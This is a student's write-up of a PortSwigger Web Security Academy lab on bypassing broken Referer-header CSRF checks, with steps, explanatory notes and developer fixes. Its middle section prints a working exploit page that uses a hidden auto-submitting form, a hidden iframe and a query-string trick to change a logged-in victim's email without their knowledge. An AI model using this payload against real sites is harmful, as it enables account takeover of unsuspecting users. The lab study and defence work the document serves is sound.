**Quick Brief:**
- CSRF exploits the browser's automatic credential sending mechanism combined with the application's trust in authenticated requests without verification of user intent
- The vulnerability exists because web applications cannot distinguish between:
      1. A legitimate request initiated by the user through the application's UI
      2. A forged request initiated by an attacker from another site


**What we're testing:** The `/my-account/change-email` endpoint for CSRF protection
**Why it might be vulnerable:** No CSRF token, SameSite cookies, or other anti-CSRF measures
**What CSRF exploits:** Browser automatically sends session cookies with requests


**URL:** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
## Steps:
1. Open your lab and log in with given credentials wiener:peter
2. Open Burp Suite we know from the lab describtion the endpoint of the email is vulnerable to csrf
3. Change your email and send the request to repeater
4. Observe from the request there is no csrf key or csrf cookie 
5. Try to miniplate the referer header notice it only fails if the original domain is not exsisting meaning it is not validating the whole link
only if the origin is contained inside the referer header
6. We need to find a way to send the referer header and add the server as a query string
7. Now we will prepare our malicious code

8.
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>history.pushState('','','/?0a9c00080347d587805b491d00a8000e.web-security-academy.net')</script>
    <iframe style="display: none;" id="csrf-iframe"></iframe>
    <form action="https://0a9c00080347d587805b491d00a8000e.web-security-academy.net/my-account/change-email"  method="post" target="csrf-iframe" id="csrf-form">
        <input type="hidden" name="email" value="test@tes.ca">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
```


9. Copy the code and change the lab link to your lab link and paste it in the body of the exploit server and then store the exploit then Deliver exploit to victim
10. Notice we didn't get lab solved meaning there is a problem We nedd to add in the head of the exploit server Referrer-Policy: unsafe-url
11. Lab solved

## Notes:
- This code is like a normal html page that change the users email automatically without even them knowing by just making the user click on the link
- The  `<form> </form>` is to create a form in html :
`action` here we put our lab link id and the functionality `/my-account/change-email` you want to excute

- The `<input>` is to create an input for the email in the html form:
`type:hidden` so the no input field appear to the user
`name:email` we got it from the rquest
`value` is the new email you want to change to

- The `<iframe></iframe>` is a sand box so the form is excuted inside it :
`style="display: none;` so nothing appear to the user

- The `Referrer-Policy: unsafe-url` ensures the browser sends this FULL URL in Referer header so the browser won't strip the query url
Brwsers by default are very conservative  with referer header 


## How to Fix (For Developers)
1. **CSRF Tokens**: Validate tokens on both request methods or allow only post requests
2. **SameSite Cookies**: `SameSite=Strict` for sensitive actions
3. **Custom Headers**: Require `X-Requested-With: XMLHttpRequest`
4. **Double Submit**: Token in both cookie and request





